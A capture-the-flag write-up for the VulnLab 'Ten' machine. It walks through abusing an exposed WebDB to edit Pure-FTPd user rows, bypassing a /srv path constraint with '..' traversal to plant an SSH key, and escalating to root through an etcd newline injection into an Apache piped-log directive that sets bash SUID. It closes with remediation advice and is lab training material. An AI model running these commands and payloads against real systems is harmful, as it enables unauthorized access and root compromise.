# Ten

| | |
|---|---|
| **Platform** | VulnLab |
| **OS** | Linux (Ubuntu 22.04) |
| **Difficulty** | Hard |
| **Topics** | FTP Provisioning Abuse · WebDB MySQL Access · SQL CHECK Constraint / Path-Traversal Bypass · etcd + remco Apache Config Injection |

Ten simulates a misconfigured shared-hosting provider. A public portal provisions FTP accounts backed by a MySQL database; an exposed WebDB instance grants unauthenticated access to that database, which is abused to hijack a real local user's FTP home and drop an SSH key. Root falls to an unauthenticated etcd instance whose values are rendered into Apache configs by `remco` and reloaded as root.

---

## Recon

```
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
```

Port 80 redirects to `/index.php` — a "free home page hosting" site. The marketing copy is the first hint at the intended path: legacy FTP upload, **static HTML only**, and a pointed note that `.htaccess` files are no longer allowed (i.e. the obvious `.htaccess` → PHP path is deliberately closed).

Content discovery surfaces the portal's moving parts:

```
/signup.php
/info.php            # full phpinfo()
/attribution.php
/get-credentials-please-do-not-spam-this-thanks.php
```

`phpinfo()` confirms the stack: PHP 8.1, `mysqli`/`pdo_mysql`, docroot `/var/www/html`, running as `www-data`. No DB credentials leak.

## The provisioning endpoint

`signup.php` POSTs a `domain` parameter to the hidden endpoint. A legitimate request returns real FTP credentials:

```bash
curl -s -X POST http://ten.vl/get-credentials-please-do-not-spam-this-thanks.php -d 'domain=test'
```

```
Username: ten-ac82e7f1
Password: 179174cd
Personal Domain: test.ten.vl
```

The `domain` parameter is filtered server-side to `^[0-9a-z]+$` — no SQL injection here. Uploaded files are served per-vhost from the FTP home; PHP does **not** execute in the vhost (source is returned verbatim), and the FTP daemon rejects `.htaccess` by filename (`553 Prohibited file name`). The upload is a dead end for direct code execution.

## Finding WebDB

Vhost fuzzing against `*.ten.vl` reveals a second host:

```bash
ffuf -w subdomains-top1million-20000.txt -u http://ten.vl/ -H "Host: FUZZ.ten.vl" -ac
# webdb   [Status: 200, Size: 1685]
```

`webdb.ten.vl` serves [**WebDB**](https://github.com/WebDB-App/app), an Angular + Express database IDE. Its headline feature — *automatic DBMS discovery and credential guessing* — means it has already discovered and connected to the local MySQL instance with no authentication required:

```
MySQL  user@127.0.0.1:3306   →   database: pureftpd
```

## FTP user hijack

The `pureftpd.users` table drives Pure-FTPd:

| id | user | password | uid | gid | dir |
|----|------|----------|-----|-----|-----|
| 1 | ten-ac82e7f1 | `$1$...` (md5crypt) | 51907 | 51907 | /srv/ten-ac82e7f1/./ |

Pure-FTPd reads `uid`, `gid` and `dir` from this row. If those are repointed at a real user's home, files written over FTP land in that home with that user's ownership.

Two obstacles:

1. **No `FILE` privilege** — `SELECT LOAD_FILE('/etc/passwd')` returns `NULL`, so `/etc/passwd` can't be read and `INTO OUTFILE` is unavailable.
2. **A CHECK constraint** — `dir_must_start_with_slash_srv` forces `dir` to begin with `/srv`.

The constraint only checks the string *prefix*. Since Pure-FTPd resolves the value as a filesystem path, `..` escapes `/srv` while still satisfying the prefix check. First, enumerate `/home`:

```sql
UPDATE users SET dir = '/srv/../home/./' WHERE user = 'ten-ac82e7f1';
```

```
drwxr-x---  1000  1000  tyrell
```

One target: `tyrell`, uid/gid 1000, home mode `750` (so writes must come from uid 1000). Repoint the FTP user directly *into* tyrell's `.ssh` — placing `.ssh` mid-path avoids the FTP filename filter that blocks creating or entering a `.ssh` directory:

```sql
UPDATE users SET uid = 1000, gid = 1000,
  dir = '/srv/../home/tyrell/.ssh/./'
WHERE user = 'ten-ac82e7f1';
```

Overwrite `authorized_keys` with an attacker-controlled key and log in:

```bash
ssh-keygen -t ed25519 -f ./ten_key -N ''
# put ./ten_key.pub as authorized_keys into the (now .ssh) FTP home
ssh -i ./ten_key tyrell@ten.vl
```

`user.txt` → `[redacted]`

## Root — etcd + remco config injection

`remco` runs as root and watches the etcd key `/customers` every 5 seconds, rendering it into an Apache config and reloading the service:

```toml
# /etc/remco/config
src        = "/etc/remco/templates/010-customers.conf.tmpl"
dst        = "/etc/apache2/sites-enabled/010-customers.conf"
reload_cmd = "systemctl restart apache2.service"
nodes      = ["http://127.0.0.1:2379"]
keys       = ["/customers"]
```

```jinja
{% for customer in lsdir("/customers") %}
  {% if exists(printf("/customers/%s/url", customer)) %}
<VirtualHost *:80>
    ServerName {{ getv(printf("/customers/%s/url",customer)) }}.ten.vl
    DocumentRoot /srv/{{ customer }}/
</VirtualHost>
  {% endif %}
{% endfor %}
```

etcd (3.5.13) listens on `127.0.0.1:2379` with **no authentication**, `etcdctl` is on the box, and the `url` value is written into the config **unescaped**. Injecting a newline into `url` breaks out of the `ServerName` line and adds arbitrary Apache directives. Apache's piped-log syntax (`CustomLog "|command"`) runs a command as root when the service restarts.

Key detail: the leftover `.ten.vl` suffix from the `ServerName` line would produce invalid config and block the restart — comment it out with `#` to keep the config valid. And keep the piped command **simple and quote-free**; a nested `bash -c '...; ...'` breaks in the log-pipe parser. A single `chmod` is reliable:

```bash
ETCDCTL_API=3 etcdctl --endpoints=http://127.0.0.1:2379 \
  put /customers/ten-ac82e7f1/url \
  $'privesc.ten.vl\n\tCustomLog "|/bin/chmod u+s /bin/bash" common\n\t#'
```

Rendered config:

```apache
<VirtualHost *:80>
    ServerName privesc.ten.vl
    CustomLog "|/bin/chmod u+s /bin/bash" common
    #.ten.vl
    DocumentRoot /srv/ten-ac82e7f1/
</VirtualHost>
```

The piped logger starts lazily, so a request to the vhost triggers it:

```bash
for i in 1 2 3; do curl -s -H "Host: privesc.ten.vl" http://127.0.0.1/ >/dev/null; done
ls -la /bin/bash          # -rwsr-xr-x root root
bash -p
id                        # uid=1000 euid=0
```

`root.txt` → `[redacted]`

---

## Kill chain

1. Portal provisions FTP accounts backed by MySQL; upload path is static-only (no PHP, no `.htaccess`).
2. Exposed **WebDB** auto-connects to local MySQL with guessed credentials → full access to `pureftpd.users`.
3. Repoint the FTP user's `uid/gid/dir` — bypassing the `/srv` CHECK constraint via `..` traversal — into `tyrell`'s `.ssh`, drop `authorized_keys` → SSH as tyrell.
4. Unauthenticated **etcd** value rendered unescaped by root **remco** into Apache config → newline injection of a piped-log directive → command execution as root → SUID bash.

## Remediation

- **WebDB**: never expose a database IDE with auto-discovery unauthenticated; bind to localhost and require auth. Give the MySQL app user least privilege.
- **Pure-FTPd / MySQL**: validate `dir` against a canonicalised path, not a string prefix; never let a web-facing table set arbitrary `uid/gid`. Chroot FTP users.
- **etcd**: enable authentication and TLS; restrict who can write `/customers`.
- **remco template**: escape/validate all values rendered into config; reject newlines. Treat template inputs as untrusted.